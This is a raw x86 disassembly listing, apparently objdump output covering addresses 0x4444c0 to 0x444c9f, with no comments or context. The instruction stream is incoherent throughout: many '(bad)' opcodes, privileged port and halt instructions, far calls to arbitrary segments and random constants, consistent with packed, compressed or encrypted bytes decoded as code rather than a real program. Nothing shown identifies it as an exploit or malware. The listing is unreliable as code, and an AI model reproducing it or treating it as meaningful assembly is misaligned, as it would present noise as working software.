  4444c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4444c1:	push   0xb416002e
  4444c6:	scas   al,BYTE PTR es:[edi]
  4444c7:	mov    ebx,0x128e6d3e
  4444cc:	xor    BYTE PTR [esi-0xf6b3056],cl
  4444d2:	or     bl,BYTE PTR [edx-0x1d499ce9]
  4444d8:	test   DWORD PTR [ebx-0x55],eax
  4444db:	ins    DWORD PTR es:[edi],dx
  4444dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4444dd:	les    ebx,FWORD PTR [esi]
  4444df:	inc    eax
  4444e0:	std    
  4444e1:	repnz push edx
  4444e3:	ss pop es
  4444e5:	and    DWORD PTR [ecx-0x242fc3f6],edx
  4444eb:	je     0x4444ed
  4444ed:	icebp  
  4444ee:	dec    ebx
  4444ef:	adc    al,0x6e
  4444f1:	ret    0x6a0a
  4444f4:	aas    
  4444f5:	add    esp,edi
  4444f7:	call   0xfa64:0xaf8220fa
  4444fe:	mov    dl,0x55
  444500:	or     BYTE PTR [edx-0x2e],bh
  444503:	adc    BYTE PTR [eax],bh
  444505:	icebp  
  444506:	mov    ah,0x5f
  444508:	es ss add al,0x98
  44450c:	test   BYTE PTR [eax+edi*2],0x5a
  444510:	push   0x10
  444512:	dec    ecx
  444513:	lahf   
  444514:	or     eax,0x50527434
  444519:	cmp    ah,BYTE PTR [edx+eax*4-0x39a1d9a9]
  444520:	pop    edi
  444521:	mov    dl,0x6a
  444523:	sbb    eax,0x2e81c6be
  444528:	push   ebx
  444529:	push   0x51e14dc
  44452e:	js     0x44457c
  444530:	loope  0x444555
  444532:	and    ch,BYTE PTR [eax+0x2d]
  444535:	(bad)  
  444536:	test   eax,0x1e225f4a
  44453b:	mov    BYTE PTR [eax-0x77],cl
  44453e:	push   es
  44453f:	ds stc 
  444541:	and    dl,ah
  444543:	aaa    
  444544:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  444545:	xor    DWORD PTR [esp+edi*4-0x64a24906],ebp
  44454c:	jp     0x444584
  44454e:	mov    eax,0xee2d28b9
  444553:	add    eax,0xc36188dc
  444558:	xchg   ebx,eax
  444559:	(bad)  
  44455a:	icebp  
  44455b:	pop    eax
  44455c:	outs   dx,BYTE PTR ds:[esi]
  44455d:	or     BYTE PTR [esi+esi*2+0x64],ch
  444561:	xchg   edx,eax
  444562:	jo     0x44456d
  444564:	xor    al,0xda
  444566:	mov    al,0xb0
  444568:	rol    DWORD PTR [ecx+ebx*4+0x4c],0xc6
  44456d:	cmp    BYTE PTR ds:0x5f86a266,cl
  444573:	ss pusha 
  444575:	mov    ebp,0x4aa68036
  44457a:	add    al,0xe1
  44457c:	test   al,0x99
  44457e:	push   0xe91a82f4
  444583:	and    eax,0xee8eb0eb
  444588:	sbb    al,0x52
  44458a:	sub    ah,BYTE PTR [esi-0x78adb40c]
  444590:	or     al,BYTE PTR [edi+0x18fb4080]
  444596:	popa   
  444597:	sti    
  444598:	xchg   BYTE PTR [edx-0x35],ch
  44459b:	jo     0x444572
  44459d:	mov    cl,0x24
  44459f:	call   0x3819:0x48195600
  4445a6:	das    
  4445a7:	cmp    dh,BYTE PTR [esi*8-0x35c87adc]
  4445ae:	dec    edi
  4445af:	xor    dl,BYTE PTR [esi]
  4445b1:	dec    eax
  4445b2:	add    bl,al
  4445b4:	adc    ebp,DWORD PTR [eax+0x4ae89a21]
  4445ba:	outs   dx,BYTE PTR ds:[esi]
  4445bb:	dec    esp
  4445bc:	jl     0x444584
  4445be:	and    ebp,DWORD PTR [ecx+0x26]
  4445c1:	jo     0x44459d
  4445c3:	pusha  
  4445c4:	shl    dh,cl
  4445c6:	pushf  
  4445c7:	xchg   ecx,eax
  4445c8:	push   0x522021db
  4445cd:	in     eax,0x5e
  4445cf:	sub    DWORD PTR [edx+ecx*8+0x47a2d2dd],esp
  4445d6:	sbb    DWORD PTR [edx-0x16],eax
  4445d9:	ds sahf 
  4445db:	jmp    0x44461a
  4445dd:	push   es
  4445de:	hlt    
  4445df:	add    dl,BYTE PTR [esi-0xc]
  4445e2:	iret   
  4445e3:	cmp    BYTE PTR [esi+0x705458fe],cl
  4445e9:	inc    esp
  4445ea:	push   edx
  4445eb:	lock shl BYTE PTR [edi-0x45a1acd4],cl
  4445f2:	mov    dh,0x23
  4445f4:	push   eax
  4445f5:	adc    cl,BYTE PTR [ecx-0x2bf634ba]
  4445fb:	nop
  4445fc:	mov    dl,BYTE PTR [ebp+0x47]
  4445ff:	mov    al,ds:0xeb36475c
  444604:	aas    
  444605:	mov    eax,0x1da4bf12
  44460a:	test   BYTE PTR [ecx-0x3],0x26
  44460e:	mov    al,0x5a
  444610:	aad    0x44
  444612:	jnp    0x44465f
  444614:	pop    eax
  444615:	and    BYTE PTR [esp+ebx*8+0x55b74074],0x86
  44461d:	mov    dl,BYTE PTR [edx+ebp*2]
  444620:	pop    esp
  444621:	or     edx,DWORD PTR [eax+0x34]
  444624:	leave  
  444625:	clc    
  444626:	inc    esp
  444627:	or     DWORD PTR [esi+eiz*1-0x62],ecx
  44462b:	add    eax,0x6ce3a06e
  444630:	lods   eax,DWORD PTR ds:[esi]
  444631:	pushf  
  444632:	cmp    BYTE PTR [esi],0x6c
  444635:	add    DWORD PTR [ebp-0x57],0x6d
  444639:	or     eax,0xa2a6a16e
  44463e:	inc    esp
  44463f:	adc    BYTE PTR [ebp+0x78580bb4],bh
  444645:	cwde   
  444646:	mov    bl,0xf
  444648:	adc    BYTE PTR [esi+0x7c],al
  44464b:	loope  0x44460a
  44464d:	sub    ch,BYTE PTR [ecx]
  44464f:	push   esp
  444650:	cmp    bh,BYTE PTR [esi]
  444652:	enter  0x331e,0xfa
  444656:	clc    
  444657:	sub    eax,0xa1624ba9
  44465c:	mov    dl,BYTE PTR [ecx]
  44465e:	out    dx,eax
  44465f:	jge    0x4445e1
  444661:	cmc    
  444662:	ret    0x7206
  444665:	xor    al,0xd0
  444667:	(bad)  
  444668:	fadd   DWORD PTR [esi]
  44466a:	mov    edi,0x7104a04c
  44466f:	mov    eax,0x81cc5de2
  444674:	or     eax,0xd8460617
  444679:	push   cs
  44467a:	nop
  44467b:	repz mov esi,0x6e967d6d
  444681:	lds    eax,FWORD PTR [edi]
  444683:	push   esi
  444684:	std    
  444685:	gs loopne 0x44461d
  444688:	and    al,0x76
  44468a:	xchg   ebx,eax
  44468b:	add    BYTE PTR [ebp-0x29],ah
  44468e:	fcmovnu st,st(4)
  444690:	nop
  444691:	push   cs
  444692:	inc    esi
  444693:	sbb    eax,0x41f3ab2
  444698:	out    dx,al
  444699:	cmp    dl,BYTE PTR [eax+0x520e5816]
  44469f:	mov    BYTE PTR [edi+0x539bde7d],0x53
  4446a6:	dec    eax
  4446a7:	call   0xad191b02
  4446ac:	sti    
  4446ad:	mov    eax,0x637e065f
  4446b2:	push   esi
  4446b3:	xor    ah,BYTE PTR [eax+eiz*8-0x1c]
  4446b7:	or     BYTE PTR [edi+ebp*2-0x57],ch
  4446bb:	fldcw  WORD PTR [edx+0x70]
  4446be:	pop    eax
  4446bf:	and    al,0xa0
  4446c1:	mov    edx,0xb600c1f6
  4446c6:	ins    DWORD PTR es:[edi],dx
  4446c7:	push   ss
  4446c8:	sbb    al,0x70
  4446ca:	dec    esi
  4446cb:	addr16 loopne 0x444656
  4446ce:	push   esi
  4446cf:	rcl    DWORD PTR [ecx+0x3d1039a1],cl
  4446d5:	mov    al,ds:0xac9684a2
  4446da:	shr    DWORD PTR [edx+0x25],0xa
  4446de:	xchg   al,al
  4446e0:	(bad)  
  4446e1:	mov    al,ds:0x4e5cd4a2
  4446e6:	inc    eax
  4446e7:	xchg   ebp,eax
  4446e8:	jnp    0x4446e0
  4446ea:	inc    eax
  4446eb:	ins    BYTE PTR es:[edi],dx
  4446ec:	dec    edi
  4446ed:	test   BYTE PTR [ecx+0x10],al
  4446f0:	sbb    al,0x86
  4446f2:	sbb    dh,BYTE PTR [edi+0x493a1a58]
  4446f8:	ror    BYTE PTR [ebx-0x7f],0xd2
  4446fc:	xchg   edx,eax
  4446fd:	push   ebp
  4446fe:	sub    DWORD PTR [ecx-0x28e731c8],esp
  444704:	lahf   
  444705:	or     eax,0xe8507a2d
  44470a:	clc    
  44470b:	fild   WORD PTR ds:0xad7ffd6a
  444711:	(bad)  
  444712:	push   esp
  444713:	pusha  
  444714:	out    dx,al
  444715:	shr    BYTE PTR ds:0x6740d37c,cl
  44471b:	mov    DWORD PTR [edi+0xbe28a80],ebx
  444721:	fcomp  DWORD PTR [eax-0x24]
  444724:	mov    al,ds:0x6885c4c9
  444729:	(bad)  
  44472a:	xor    ch,BYTE PTR [eax]
  44472c:	mov    eax,ds:0x24845aa8
  444731:	cli    
  444732:	xchg   esp,eax
  444733:	cmp    BYTE PTR [edx-0x5fdb8525],cl
  444739:	add    al,BYTE PTR [eax-0x1e8dfed8]
  44473f:	xchg   ecx,eax
  444740:	mov    ch,0x1d
  444742:	xchg   edx,eax
  444743:	ret    0xe05e
  444746:	inc    ebx
  444747:	cmp    al,0xcb
  444749:	cmp    ecx,DWORD PTR [edi+0x19]
  44474c:	clc    
  44474d:	dec    eax
  44474e:	test   bh,0x7a
  444751:	fs inc edx
  444753:	loop   0x4446de
  444755:	les    ebx,FWORD PTR [ecx-0x1f]
  444758:	nop
  444759:	mov    ah,0x1c
  44475b:	push   edx
  44475c:	push   0xffffffaf
  44475e:	mov    BYTE PTR [ecx+0x3414a524],al
  444764:	xchg   BYTE PTR [ebp-0x4f1edb40],dh
  44476a:	cdq    
  44476b:	repnz mov ah,0xae
  44476e:	pusha  
  44476f:	mov    ds:0xcaa438a9,eax
  444774:	fadd   DWORD PTR [esi-0x51]
  444777:	stc    
  444778:	mov    eax,0x90055580
  44477d:	jo     0x4447a3
  44477f:	add    eax,DWORD PTR ds:0x70083400
  444785:	lds    esp,FWORD PTR [eax]
  444787:	jp     0x4447f5
  444789:	mov    ds:0x86889ceb,eax
  44478e:	mov    ds:0x76f8ffc,eax
  444793:	push   es
  444794:	lock inc ebx
  444796:	fdivr  DWORD PTR [esi-0x7e]
  444799:	rcl    ah,1
  44479b:	push   edx
  44479c:	(bad)  
  44479d:	and    eax,DWORD PTR [eax+0x42c089]
  4447a3:	inc    edx
  4447a4:	inc    ecx
  4447a5:	xchg   ecx,eax
  4447a6:	les    ebx,FWORD PTR [eax+0x438ac04f]
  4447ac:	sbb    al,BYTE PTR [ebp+0x60c66286]
  4447b2:	push   0xc2ca3c42
  4447b7:	jl     0x44475f
  4447b9:	push   cs
  4447ba:	clc    
  4447bb:	stos   BYTE PTR es:[edi],al
  4447bc:	gs loope 0x444746
  4447bf:	mov    al,ds:0x36ae1c04
  4447c4:	fsub   DWORD PTR [ecx-0x6c]
  4447c7:	lock hlt 
  4447c9:	fst    st(0)
  4447cb:	sbb    BYTE PTR [edi+0x3c36a451],dh
  4447d1:	add    DWORD PTR [edx],ecx
  4447d3:	xchg   ebp,eax
  4447d4:	push   esi
  4447d5:	mov    ebx,0x3b482b38
  4447da:	mov    ebp,0x59f429f4
  4447df:	inc    ebx
  4447e0:	in     eax,0x2e
  4447e2:	enter  0x58f1,0xc4
  4447e6:	mov    bh,0x2d
  4447e8:	in     al,0xa3
  4447ea:	int    0x42
  4447ec:	(bad)  
  4447ed:	cli    
  4447ee:	xor    al,0xb1
  4447f0:	(bad)  
  4447f1:	loopne 0x444855
  4447f3:	add    ch,BYTE PTR [edi-0xf654f1c]
  4447f9:	inc    ecx
  4447fa:	or     ecx,DWORD PTR [esi+0x46a7c8ba]
  444800:	jnp    0x444808
  444802:	or     dl,BYTE PTR [eax+0x2847caa1]
  444808:	mov    ch,0x1d
  44480a:	mov    ebx,0xce124cba
  44480f:	xchg   edx,eax
  444810:	ret    0xafa7
  444813:	mov    ah,BYTE PTR [ebp+ecx*4-0x2a]
  444817:	cmc    
  444818:	or     DWORD PTR [esi+ebp*1-0x594b49d7],ecx
  44481f:	lods   al,BYTE PTR ds:[esi]
  444820:	js     0x44488e
  444822:	loopne 0x44483b
  444824:	xor    BYTE PTR [edi-0x6f809940],dl
  44482a:	mov    esp,0xea1af590
  44482f:	adc    al,0xa0
  444831:	aam    0x3d
  444833:	mov    BYTE PTR [eax+0x30018d63],ch
  444839:	ror    BYTE PTR [esi+eax*2-0x25],0x28
  44483e:	imul   ecx,DWORD PTR [esi+0x220c9b48],0xf593e2c4
  444848:	sbb    ebp,DWORD PTR [edx]
  44484a:	and    ah,ch
  44484c:	outs   dx,BYTE PTR ds:[esi]
  44484d:	mov    ds:0x780b4fe2,eax
  444852:	sub    DWORD PTR [ecx+eiz*8-0xfdd5947],edi
  444859:	adc    al,0x82
  44485c:	and    edx,DWORD PTR [ecx+ebx*1+0x5b]
  444860:	add    al,0x63
  444862:	dec    ebp
  444863:	cmp    eax,0xa8204524
  444868:	sub    DWORD PTR [eax+edi*1],eax
  44486b:	push   eax
  44486c:	stos   BYTE PTR es:[edi],al
  44486d:	add    BYTE PTR [esi+eax*8],bl
  444870:	add    ecx,edi
  444872:	and    dh,BYTE PTR [esi+0x2c]
  444875:	loopne 0x44481f
  444877:	ds jne 0x44484a
  44487a:	xor    ecx,DWORD PTR [esp+edx*2]
  44487d:	in     al,0xde
  44487f:	inc    edx
  444880:	sub    al,BYTE PTR [edi+ebx*1+0x10c24cd8]
  444887:	mov    bl,0xe7
  444889:	mov    al,ds:0x495eedf8
  44488e:	fidivr DWORD PTR [esi-0x5dbf8c00]
  444894:	ins    BYTE PTR es:[edi],dx
  444895:	scas   al,BYTE PTR es:[edi]
  444896:	mov    eax,0xf5b4c0
  44489b:	adc    bl,dl
  44489d:	push   ebx
  44489e:	sbb    al,0x10
  4448a0:	scas   al,BYTE PTR es:[edi]
  4448a1:	popa   
  4448a2:	std    
  4448a3:	jmp    0x3405:0x19def190
  4448aa:	or     eax,DWORD PTR [esp+ecx*2-0x64]
  4448ae:	test   DWORD PTR [edx+ebx*2+0x6],edi
  4448b2:	fcmovnbe st,st(0)
  4448b4:	scas   al,BYTE PTR es:[edi]
  4448b5:	sub    ah,BYTE PTR [esi]
  4448b7:	inc    eax
  4448b8:	stos   BYTE PTR es:[edi],al
  4448b9:	pop    esp
  4448ba:	jb     0x4448f4
  4448bc:	mov    dl,0xd4
  4448be:	push   ebp
  4448bf:	jmp    0x5d06:0xa540c493
  4448c6:	dec    edx
  4448c7:	repz xchg ebx,eax
  4448c9:	sbb    ch,BYTE PTR [ebx-0x79]
  4448cc:	retf   0xd96
  4448cf:	aam    0x18
  4448d1:	ins    DWORD PTR es:[edi],dx
  4448d2:	fbstp  TBYTE PTR [edx-0x77cf0950]
  4448d8:	push   eax
  4448d9:	int    0x2e
  4448db:	outs   dx,DWORD PTR ds:[esi]
  4448dc:	dec    DWORD PTR [eax]
  4448de:	push   0xd8d68155
  4448e3:	inc    esp
  4448e4:	retfw  0x58d6
  4448e8:	and    DWORD PTR [esi],esp
  4448ea:	je     0x444910
  4448ec:	ja     0x444924
  4448ee:	mov    gs,eax
  4448f0:	mov    al,ds:0x90fd146
  4448f5:	stos   BYTE PTR es:[edi],al
  4448f6:	fsubr  st(6),st
  4448f8:	mov    esp,0x2c64ae07
  4448fd:	clc    
  4448fe:	jl     0x444977
  444900:	jle    0x44496d
  444902:	and    eax,0xa93fe82c
  444907:	pminub mm5,QWORD PTR [eax]
  44490a:	push   esi
  44490b:	jb     0x4448e7
  44490d:	push   eax
  44490e:	enter  0x2d06,0x71
  444912:	dec    eax
  444913:	icebp  
  444914:	pop    ecx
  444915:	push   0xffffffc4
  444917:	xchg   ecx,eax
  444918:	xchg   edx,eax
  444919:	sbb    BYTE PTR [esi-0xc],dl
  44491c:	push   0x1c6e88bf
  444921:	xchg   edx,eax
  444922:	adc    al,0x4d
  444924:	jnp    0x44498a
  444926:	enter  0x3540,0xe0
  44492a:	rcl    DWORD PTR [edx],cl
  44492c:	dec    edx
  44492d:	shr    BYTE PTR [ebx],cl
  44492f:	mov    dh,0xe6
  444931:	push   es
  444932:	ds add dh,cl
  444935:	into   
  444936:	cmp    cl,BYTE PTR [ebx]
  444938:	lods   al,BYTE PTR ds:[esi]
  444939:	inc    edi
  44493a:	cmp    DWORD PTR [edi],ebx
  44493c:	pusha  
  44493d:	loope  0x4448d0
  44493f:	(bad)  
  444941:	xor    DWORD PTR [esi-0x32526105],ebx
  444947:	pop    esi
  444948:	dec    ebx
  444949:	mov    BYTE PTR [ecx+0x7da0463e],bh
  44494f:	popa   
  444950:	push   ds
  444951:	or     al,0xe0
  444953:	and    edx,DWORD PTR [edx]
  444955:	dec    esp
  444956:	push   ebp
  444957:	xchg   esi,eax
  444958:	dec    ebp
  444959:	mov    dh,0x2
  44495b:	xchg   ebp,eax
  44495c:	sbb    ah,BYTE PTR [edx-0x7b]
  44495f:	jb     0x4449a9
  444961:	cli    
  444962:	adc    BYTE PTR [ecx-0x4e5c1d97],bh
  444968:	rcr    DWORD PTR [esi+eax*4],0x71
  44496c:	and    al,cl
  44496e:	mov    edi,0xc29be126
  444973:	imul   ecx,DWORD PTR [eax+0x57d25ce6],0xffffffd6
  44497a:	nop
  44497b:	push   eax
  44497c:	add    al,0xa0
  44497e:	mov    esi,0xa021bff7
  444983:	add    eax,eax
  444985:	or     eax,0x16113ab4
  44498a:	mov    ah,0x27
  44498c:	or     DWORD PTR [edx+ecx*4+0x34],ebx
  444990:	clc    
  444991:	push   ds
  444992:	sahf   
  444993:	sub    DWORD PTR [ecx+0x8],esp
  444996:	(bad)  
  444997:	mov    dl,0x16
  444999:	adc    BYTE PTR [ebx],al
  44499b:	sbb    eax,0xf2c01e1b
  4449a0:	es daa 
  4449a2:	dec    edi
  4449a3:	xchg   esi,eax
  4449a4:	mov    eax,0x1e920f45
  4449a9:	cwde   
  4449aa:	pop    ss
  4449ab:	cmp    DWORD PTR [edx-0x55],ecx
  4449ae:	ret    0x276f
  4449b1:	mov    ds:0x4c56b362,eax
  4449b6:	fs mov ch,0x67
  4449b9:	add    al,0xef
  4449bb:	js     0x444966
  4449bd:	and    eax,0xb4dca588
  4449c2:	fimul  DWORD PTR [edi]
  4449c4:	mov    al,0x3a
  4449c6:	sub    eax,0x393a4398
  4449cb:	sub    al,0xb
  4449cd:	mov    edi,0x194e2b89
  4449d2:	aad    0xac
  4449d4:	mov    ds:0xb8a476f9,eax
  4449d9:	cmp    DWORD PTR fs:[ebp+0x0],ebp
  4449dd:	je     0x4449de
  4449df:	xor    esp,DWORD PTR [eax-0xe]
  4449e2:	inc    esi
  4449e3:	(bad)  
  4449e4:	nop/reserved BYTE PTR [ebx]
  4449e7:	pop    edx
  4449e8:	scas   eax,DWORD PTR es:[edi]
  4449e9:	call   0x78fe94ba
  4449ee:	mov    eax,ds:0x574000eb
  4449f3:	nop
  4449f4:	cli    
  4449f5:	push   esi
  4449f6:	fisttp WORD PTR [ecx]
  4449f8:	call   0xa488fe2e
  4449fd:	jno    0x444a39
  4449ff:	lahf   
  444a00:	adc    DWORD PTR [eax+eax*2+0x21],0xd25c587b
  444a08:	cli    
  444a09:	(bad)  
  444a0a:	xor    bh,BYTE PTR [ebx]
  444a0c:	sbb    BYTE PTR [eax+0x2f],dl
  444a0f:	dec    ecx
  444a10:	les    edx,FWORD PTR [esp+edi*1]
  444a13:	ret    0xa6a
  444a16:	push   ss
  444a17:	push   ebx
  444a18:	fcomp  st(1)
  444a1a:	push   cs
  444a1b:	imul   BYTE PTR [eax+0x5d]
  444a1e:	sub    edi,DWORD PTR [eax-0x47936da8]
  444a24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  444a25:	not    ch
  444a27:	(bad)  
  444a28:	adc    dh,BYTE PTR [eax+ecx*2+0x6a]
  444a2c:	push   ecx
  444a2d:	mov    cs,esi
  444a2f:	int3   
  444a30:	test   al,0x6
  444a32:	and    DWORD PTR [esi],0xaee2c466
  444a38:	hlt    
  444a39:	cld    
  444a3a:	add    dh,ah
  444a3c:	dec    ecx
  444a3d:	mov    dh,0x15
  444a3f:	and    edx,esp
  444a41:	xchg   ebx,eax
  444a42:	out    0xf6,eax
  444a44:	or     ch,BYTE PTR [eax+0x7b]
  444a47:	icebp  
  444a48:	ja     0x444a6d
  444a4a:	sbb    al,0x22
  444a4c:	clc    
  444a4d:	ins    BYTE PTR es:[edi],dx
  444a4e:	inc    ecx
  444a4f:	sbb    al,0xb1
  444a51:	lea    ebp,[esi]
  444a53:	push   eax
  444a54:	and    BYTE PTR [ecx],ch
  444a56:	pusha  
  444a57:	pop    ss
  444a58:	jo     0x444a7a
  444a5a:	loop   0x4449e7
  444a5c:	enter  0xc97e,0xe2
  444a60:	xchg   esi,eax
  444a61:	cmc    
  444a62:	rol    BYTE PTR [eax+0x4a],1
  444a65:	xchg   esp,eax
  444a66:	pop    ebp
  444a67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  444a68:	xchg   BYTE PTR [edi],ch
  444a6a:	mov    eax,ds:0x46afa4bd
  444a6f:	sub    BYTE PTR [edx],dh
  444a71:	sub    cl,BYTE PTR [ecx]
  444a73:	xor    dl,BYTE PTR [edi-0x137b4cc0]
  444a79:	jmp    0x36f8:0xd9cf10aa
  444a80:	test   BYTE PTR [ebx],dh
  444a82:	dec    esi
  444a83:	pop    edi
  444a84:	imul   BYTE PTR [ecx]
  444a86:	pusha  
  444a87:	xchg   DWORD PTR [esi+0xc],esi
  444a8a:	out    0x36,al
  444a8c:	xchg   esi,eax
  444a8d:	mov    edx,0x58eb2a16
  444a92:	(bad)  
  444a93:	jno    0x444ae4
  444a95:	sahf   
  444a96:	push   eax
  444a97:	mov    al,ds:0xa917c36c
  444a9c:	shl    esp,cl
  444a9e:	push   ebx
  444a9f:	ret    0x8f
  444aa2:	inc    esi
  444aa3:	push   ebp
  444aa4:	in     eax,0x80
  444aa6:	sbb    dh,BYTE PTR [eax-0x2f4b8980]
  444aac:	pop    esp
  444aad:	cwde   
  444aae:	call   0xc2989eb3
  444ab3:	sbb    eax,0x6d09abb5
  444ab8:	xor    al,0x58
  444aba:	cld    
  444abb:	push   eax
  444abc:	or     ecx,DWORD PTR [eax+esi*2-0x714e1800]
  444ac3:	adc    DWORD PTR [eax-0x7a],ebp
  444ac6:	jb     0x444ad3
  444ac8:	pop    eax
  444aca:	(bad)  
  444acb:	mov    al,0x6c
  444acd:	xor    al,0x6b
  444acf:	and    esp,ebp
  444ad1:	lods   al,BYTE PTR ds:[esi]
  444ad2:	pop    ebp
  444ad3:	inc    ebp
  444ad4:	add    eax,0x4a24ac66
  444ad9:	mov    esp,0x3225c37
  444ade:	outs   dx,BYTE PTR ds:[esi]
  444adf:	adc    eax,DWORD PTR [ebp-0x7a]
  444ae2:	fsub   QWORD PTR es:[eax]
  444ae5:	test   al,0x58
  444ae7:	sbb    cl,BYTE PTR cs:[edx-0x14c9358d]
  444aee:	call   0xb00ae6c6
  444af3:	jbe    0x444b2f
  444af5:	ja     0x444a7a
  444af7:	call   0xaa00:0xa225c1ab
  444afe:	sbb    bh,BYTE PTR [eax]
  444b00:	(bad)  
  444b01:	pop    edx
  444b02:	sub    ch,0x12
  444b05:	js     0x444aff
  444b07:	test   DWORD PTR [edx+0x6076c070],edi
  444b0d:	stos   BYTE PTR es:[edi],al
  444b0e:	test   BYTE PTR [eax-0x77c531be],0x23
  444b15:	sbb    edi,DWORD PTR [eax-0x7b]
  444b18:	fild   QWORD PTR [eax-0x9]
  444b1b:	cdq    
  444b1c:	pop    eax
  444b1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  444b1f:	arpl   bx,ax
  444b21:	xor    eax,0x3212923e
  444b26:	outs   dx,BYTE PTR ds:[esi]
  444b27:	adc    al,ah
  444b29:	loop   0x444af0
  444b2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  444b2c:	xchg   ecx,eax
  444b2d:	mov    ah,0xb9
  444b2f:	sbb    BYTE PTR [ebx],bl
  444b31:	add    BYTE PTR [ebx+0x32ce7c],dh
  444b37:	dec    ebx
  444b38:	inc    ebx
  444b39:	mov    ebp,DWORD PTR [edx]
  444b3b:	fs inc esp
  444b3d:	or     ah,BYTE PTR [edi+ecx*4+0x796a36b4]
  444b44:	mov    ds:0x4a38bd60,al
  444b49:	sub    ebx,edx
  444b4b:	daa    
  444b4c:	ret    0xd6b8
  444b4f:	push   ss
  444b50:	lods   al,BYTE PTR ds:[esi]
  444b51:	in     al,dx
  444b52:	xchg   ebx,eax
  444b53:	rol    al,0xa6
  444b56:	add    ebp,DWORD PTR [eax-0x2a]
  444b59:	mov    al,ds:0x7c08a66a
  444b5e:	xor    ah,0xba
  444b61:	or     ecx,DWORD PTR [ebx]
  444b63:	push   esi
  444b64:	push   ecx
  444b65:	test   DWORD PTR [ecx+eiz*1+0x3],esi
  444b69:	pshufw mm6,QWORD PTR [edx],0xbb
  444b6d:	jo     0x444b8a
  444b6f:	mov    al,ds:0x64d8d2f0
  444b74:	and    DWORD PTR [ebp-0xb83a184],ecx
  444b7a:	and    DWORD PTR [ecx+0x7b],ebp
  444b7d:	and    dh,dh
  444b7f:	(bad)  
  444b80:	xor    BYTE PTR [edi],bl
  444b82:	sbb    BYTE PTR [ecx-0x35],ch
  444b85:	icebp  
  444b86:	enter  0xaa5a,0xc0
  444b8a:	and    DWORD PTR [edi+eax*8-0x4bee9f23],esi
  444b91:	ret    0x9c2c
  444b94:	inc    eax
  444b95:	adc    edx,eax
  444b97:	add    BYTE PTR [ecx+0x2f],al
  444b9a:	ins    BYTE PTR es:[edi],dx
  444b9b:	loopne 0x444bbe
  444b9d:	(bad)  
  444b9e:	add    cl,dl
  444ba0:	cdq    
  444ba1:	xchg   edi,eax
  444ba2:	sbb    cl,BYTE PTR [eax]
  444ba4:	cmp    eax,0x266e8b7a
  444ba9:	fcom   DWORD PTR es:[eax+eiz*2-0x25]
  444bae:	cdq    
  444baf:	push   ss
  444bb0:	pop    ecx
  444bb1:	and    al,BYTE PTR [esi+eax*1]
  444bb4:	cwde   
  444bb5:	inc    esi
  444bb6:	adc    ecx,esp
  444bb8:	adc    al,0x51
  444bba:	cmp    BYTE PTR [eax],bl
  444bbc:	dec    edx
  444bbd:	push   esi
  444bbe:	pop    ss
  444bbf:	sbb    dl,BYTE PTR [esi+0x29]
  444bc2:	push   ss
  444bc3:	test   cl,bl
  444bc5:	fldenv [edx]
  444bc7:	scas   al,BYTE PTR es:[edi]
  444bc8:	adc    bh,BYTE PTR [eax+eiz*1+0x3d28acb3]
  444bcf:	xor    dl,BYTE PTR [ecx+eiz*2-0x253dbb25]
  444bd6:	push   esi
  444bd7:	add    eax,0x754cb914
  444bdc:	inc    ebx
  444bdd:	(bad)  
  444bde:	add    eax,0x6e8c2758
  444be3:	stos   DWORD PTR es:[edi],eax
  444be4:	inc    eax
  444be5:	ret    
  444be6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  444be7:	push   cs
  444be8:	or     dh,BYTE PTR [esi]
  444bea:	sti    
  444beb:	dec    ebp
  444bec:	loop   0x444baa
  444bee:	xchg   eax,ecx
  444bf0:	rcr    BYTE PTR [eax],cl
  444bf2:	ror    BYTE PTR [edx],1
  444bf4:	mov    ss,ecx
  444bf6:	add    ah,ch
  444bf8:	clc    
  444bf9:	adc    BYTE PTR [ebx+esi*2+0x251323d2],0x34
  444c01:	mov    ebx,0xce03ce1e
  444c06:	call   0x9be7dfc6
  444c0b:	shl    BYTE PTR [edi],0x58
  444c0e:	outs   dx,BYTE PTR ds:[esi]
  444c0f:	fs push ecx
  444c11:	dec    ebx
  444c12:	sbb    edi,DWORD PTR [eax+0x65]
  444c15:	rcl    BYTE PTR [eax+0x2a],0x90
  444c19:	dec    eax
  444c1a:	pop    ebp
  444c1b:	xchg   ebx,eax
  444c1c:	ret    0xa1b5
  444c1f:	inc    edx
  444c20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  444c21:	sub    al,0x10
  444c23:	dec    ecx
  444c24:	int    0x2c
  444c26:	cmp    al,BYTE PTR [esi-0x30a063e0]
  444c2c:	or     edx,DWORD PTR [ebx-0x51]
  444c2f:	dec    ebp
  444c30:	or     ah,dh
  444c32:	loop   0x444be6
  444c34:	xor    al,0xb7
  444c36:	psrld  mm6,QWORD PTR [edx+eiz*4+0x169a9e20]
  444c3e:	stos   BYTE PTR es:[edi],al
  444c3f:	add    BYTE PTR [edx-0x72bd9430],bh
  444c45:	inc    ecx
  444c46:	sti    
  444c47:	jmp    0x2354fd23
  444c4c:	pusha  
  444c4d:	inc    ebx
  444c4e:	cmp    cl,BYTE PTR [eax+edi*1-0x57]
  444c52:	xlat   BYTE PTR ds:[ebx]
  444c53:	mov    edx,0xb42671a4
  444c58:	scas   al,BYTE PTR es:[edi]
  444c59:	push   ds
  444c5a:	sub    DWORD PTR [ecx-0x80],esp
  444c5d:	fs adc dl,dl
  444c60:	jle    0x444c0d
  444c62:	inc    edx
  444c63:	mov    cl,0x35
  444c65:	dec    esi
  444c66:	mov    ds:0x4164228,eax
  444c6b:	call   0xb38894c2
  444c70:	inc    edx
  444c71:	in     al,dx
  444c72:	and    dl,BYTE PTR [edx+0x64]
  444c75:	das    
  444c76:	or     DWORD PTR [eax+0x5f6ea22b],0x2606275a
  444c80:	xor    DWORD PTR [eax],edx
  444c82:	or     bl,BYTE PTR ss:[esp+ebx*4+0x5b42f6f4]
  444c8a:	stos   DWORD PTR es:[edi],eax
  444c8b:	mov    edx,0x34258861
  444c90:	and    ah,BYTE PTR [ebx+0x3429935e]
  444c96:	lahf   
  444c97:	(bad)  
  444c98:	test   BYTE PTR [eax-0x41a1dbdc],0x37
  444c9f:	lock sbb bl,bl
